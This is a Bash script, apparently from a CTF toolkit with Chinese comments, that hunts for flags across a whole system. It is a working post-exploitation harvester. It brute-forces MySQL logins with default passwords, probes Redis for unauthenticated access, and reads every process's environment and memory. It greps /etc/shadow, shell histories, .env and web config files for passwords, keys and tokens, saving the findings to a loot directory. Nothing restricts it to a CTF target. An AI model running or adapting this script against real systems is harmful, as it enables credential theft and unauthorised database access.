#!/bin/bash
# CTF Flag搜索器 v2 — 全系统深度搜索
# 用法: bash flag_hunter.sh [PATH]

SEARCH_PATH="${1:-/}"
OUTDIR="/root/ctf-toolkit/loot/flag_hunt/$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; NC='\033[0m'

echo -e "${CYAN}=== Flag深度搜索: $SEARCH_PATH ===${NC}"

# 1. 文件名搜索
echo -e "\n${CYAN}[1/8] 文件名搜索${NC}"
find "$SEARCH_PATH" -maxdepth 6 \( -iname "*flag*" -o -iname "*ctf*" -o -iname "*secret*" -o -iname "*key*" \) \
    -type f 2>/dev/null | grep -v "/proc/\|/sys/\|.pyc\|__pycache__\|node_modules" | head -30 | tee "$OUTDIR/filenames.txt"

# 2. 文件内容 — flag{格式
echo -e "\n${CYAN}[2/8] flag格式搜索${NC}"
grep -rl --include="*.txt" --include="*.php" --include="*.py" --include="*.js" --include="*.html" \
    --include="*.xml" --include="*.json" --include="*.yml" --include="*.yaml" --include="*.conf" \
    --include="*.cfg" --include="*.ini" --include="*.env" --include="*.sql" --include="*.sh" \
    --include="*.md" --include="*.log" --include="*.bak" --include="*.old" --include="*.swp" \
    -rE "flag\{|FLAG\{|ctf\{|CTF\{" "$SEARCH_PATH" 2>/dev/null | grep -v "/proc/\|/sys/\|.pyc" | head -30 | tee "$OUTDIR/flag_content.txt"

# 提取具体flag值
while read f; do
    flags=$(grep -oE "(flag|FLAG|ctf|CTF)\{[^}]*\}" "$f" 2>/dev/null)
    for flag in $flags; do
        echo -e "${RED}[!] FLAG: $flag${NC} (in $f)" | tee -a "$OUTDIR/flags_extracted.txt"
    done
done < "$OUTDIR/flag_content.txt"

# 3. Base64编码的flag
echo -e "\n${CYAN}[3/8] Base64编码flag搜索${NC}"
grep -rohE "[A-Za-z0-9+/]{40,}={0,2}" "$SEARCH_PATH" --include="*.txt" --include="*.py" --include="*.js" --include="*.conf" 2>/dev/null | head -50 | while read b64; do
    decoded=$(echo "$b64" | base64 -d 2>/dev/null)
    echo "$decoded" | grep -qiE "flag|ctf|secret" && echo -e "${RED}[!] Base64: $b64 → $decoded${NC}" | tee -a "$OUTDIR/flags_b64.txt"
done

# 4. Hex编码的flag
echo -e "\n${CYAN}[4/8] Hex编码flag搜索${NC}"
grep -rohE "[0-9a-f]{32,}" "$SEARCH_PATH" --include="*.txt" --include="*.py" --include="*.conf" 2>/dev/null | head -50 | while read hex; do
    decoded=$(echo "$hex" | xxd -r -p 2>/dev/null)
    echo "$decoded" | grep -qiE "flag|ctf" && echo -e "${RED}[!] Hex: $hex → $decoded${NC}" | tee -a "$OUTDIR/flags_hex.txt"
done

# 5. 环境变量
echo -e "\n${CYAN}[5/8] 环境变量搜索${NC}"
env 2>/dev/null | grep -iE "flag|ctf|secret|key|token|password" | tee "$OUTDIR/env_vars.txt"
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE "flag|ctf|secret" | tee -a "$OUTDIR/env_vars.txt"
# 所有进程环境变量
for pid in $(ls /proc/ 2>/dev/null | grep -E "^[0-9]+$" | head -50); do
    cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE "flag\{|FLAG\{" | tee -a "$OUTDIR/env_vars.txt"
done

# 6. 数据库
echo -e "\n${CYAN}[6/8] 数据库搜索${NC}"
# MySQL
for user in root mysql admin; do
    for pass in "" "root" "mysql" "admin" "123456" "password"; do
        result=$(timeout 3 mysql -u "$user" -p"$pass" -e "SELECT schema_name FROM information_schema.schemata" 2>/dev/null)
        if [ -n "$result" ]; then
            echo -e "${GREEN}[+] MySQL登录: $user:$pass${NC}" | tee -a "$OUTDIR/db_creds.txt"
            # 搜索flag表
            mysql -u "$user" -p"$pass" -e "SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%flag%'" 2>/dev/null | tee -a "$OUTDIR/db_flags.txt"
            break
        fi
    done
done

# Redis
redis_out=$(timeout 3 redis-cli KEYS "*" 2>/dev/null)
if [ -n "$redis_out" ]; then
    echo -e "${GREEN}[+] Redis未授权${NC}" | tee -a "$OUTDIR/db_creds.txt"
    echo "$redis_out" | grep -i flag | tee -a "$OUTDIR/db_flags.txt"
    redis-cli GET flag 2>/dev/null | tee -a "$OUTDIR/db_flags.txt"
fi

# SQLite
find "$SEARCH_PATH" -maxdepth 5 \( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" \) -type f 2>/dev/null | while read db; do
    echo "[*] SQLite: $db" | tee -a "$OUTDIR/db_flags.txt"
    sqlite3 "$db" ".tables" 2>/dev/null | grep -i flag | tee -a "$OUTDIR/db_flags.txt"
    for table in $(sqlite3 "$db" ".tables" 2>/dev/null | grep -i flag); do
        sqlite3 "$db" "SELECT * FROM $table LIMIT 5" 2>/dev/null | tee -a "$OUTDIR/db_flags.txt"
    done
done

# 7. 内存搜索
echo -e "\n${CYAN}[7/8] 内存搜索${NC}"
strings /proc/*/mem 2>/dev/null | grep -oE "(flag|FLAG|ctf|CTF)\{[^}]*\}" | sort -u | head -10 | tee "$OUTDIR/memory_flags.txt"

# 8. 历史文件/配置
echo -e "\n${CYAN}[8/8] 历史与配置搜索${NC}"
for f in ~/.bash_history /root/.bash_history /home/*/.bash_history \
         /root/.mysql_history /root/.python_history /root/.wget-hsts \
         /etc/passwd /etc/shadow /etc/hosts \
         /var/www/html/.env /var/www/html/config.php \
         /opt/*/config* /etc/nginx/sites-enabled/* \
         /etc/apache2/sites-enabled/*; do
    [ -f "$f" ] && grep -iE "flag|ctf|secret|password|key" "$f" 2>/dev/null | head -5 | tee -a "$OUTDIR/history.txt"
done

# 汇总
echo ""
echo -e "${CYAN}══════════════════════════════════════════${NC}"
echo -e "${CYAN}  Flag搜索完成${NC}"
echo -e "${CYAN}══════════════════════════════════════════${NC}"
echo "结果目录: $OUTDIR"
echo ""

if [ -s "$OUTDIR/flags_extracted.txt" ]; then
    echo -e "${RED}[!] 提取到的Flag:${NC}"
    cat "$OUTDIR/flags_extracted.txt"
fi
if [ -s "$OUTDIR/memory_flags.txt" ]; then
    echo -e "${RED}[!] 内存中的Flag:${NC}"
    cat "$OUTDIR/memory_flags.txt"
fi
